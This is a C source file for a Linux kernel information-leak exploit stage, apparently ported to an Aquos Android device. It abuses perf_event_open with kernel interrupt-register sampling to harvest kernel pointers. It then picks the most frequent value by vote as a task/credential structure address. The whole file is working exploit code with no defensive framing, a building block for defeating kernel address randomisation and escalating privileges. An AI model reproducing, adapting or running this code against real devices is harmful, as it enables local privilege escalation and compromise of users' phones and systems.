/* dev_find_task: task/cred leak via perf REGS mode-vote (aquos port).
 * No function-specific filter: harvest every kernel-range register
 * across samples, return the mode. Needs only perf_open+mmap. */
#include <errno.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#ifndef SYS_perf_event_open
#define SYS_perf_event_open 241
#endif
#define PERF_EVENT_IOC_ENABLE _IO('$', 0)
#define PERF_EVENT_IOC_DISABLE _IO('$', 1)

int main(void)
{
    struct perf_event_attr pe;
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(120);
    printf("dev_find_task: REGS mode-vote leak trial\n");
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 5000;
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr = (1ULL << 32) - 1;
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_hv = 1;
    pe.exclude_idle = 1;
    errno = 0;
    int fd = syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
    printf("perf_open: fd=%d errno=%d\n", fd, errno);
    if (fd < 0)
        return 2;
    long ps = sysconf(_SC_PAGESIZE);
    size_t msz = (size_t)ps * 33;
    void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED)
        return 2;
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (volatile int i = 0; i < 500000; i++)
        syscall(SYS_getpid);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    struct perf_event_mmap_page *hdr = buf;
    uint64_t head = hdr->data_head;
    __sync_synchronize();
    char *base = (char *)buf + 4096;
    size_t dsz = 4096 * 32;
    uint64_t pos = hdr->data_tail;
    uint64_t cands[256];
    int nc = 0;
    while (pos < head && nc < 256) {
        uint8_t hb[16];
        uint64_t off = pos & (dsz - 1);
        if (off + 16 <= dsz)
            memcpy(hb, base + off, 16);
        else {
            size_t first = dsz - off;
            memcpy(hb, base + off, first);
            memcpy(hb + first, base, 16 - first);
        }
        uint32_t type;
        uint16_t size;
        memcpy(&type, hb, 4);
        memcpy(&size, hb + 6, 2);
        if (size == 0)
            break;
        if (type == PERF_RECORD_SAMPLE) {
            uint64_t abi;
            uint64_t ao = (pos + 8 + 8) & (dsz - 1);
            if (ao + 8 <= dsz)
                memcpy(&abi, base + ao, 8);
            else
                abi = 0;
            if (abi == 1 || abi == 2) {
                for (int i = 0; i < 32 && nc < 256; i++) {
                    uint64_t v = 0;
                    uint64_t ro =
                        (pos + 8 + 8 + 8 + (uint64_t)i * 8) & (dsz - 1);
                    if (ro + 8 <= dsz)
                        memcpy(&v, base + ro, 8);
                    if (v > 0xffffff8000000000ULL &&
                        v < 0xfffffffe00000000ULL)
                        cands[nc++] = v;
                }
            }
        }
        pos += size;
    }
    hdr->data_tail = head;
    munmap(buf, msz);
    close(fd);
    if (!nc) {
        printf("dev_find_task: no candidates\n");
        return 2;
    }
    uint64_t best = 0;
    int bestc = 0;
    for (int i = 0; i < nc; i++) {
        int c = 0;
        for (int j = 0; j < nc; j++)
            if (cands[j] == cands[i])
                c++;
        if (c > bestc) {
            bestc = c;
            best = cands[i];
        }
    }
    printf("dev_find_task: best=%#llx (%d/%d votes)\n",
           (unsigned long long)best, bestc, nc);
    return 0;
}
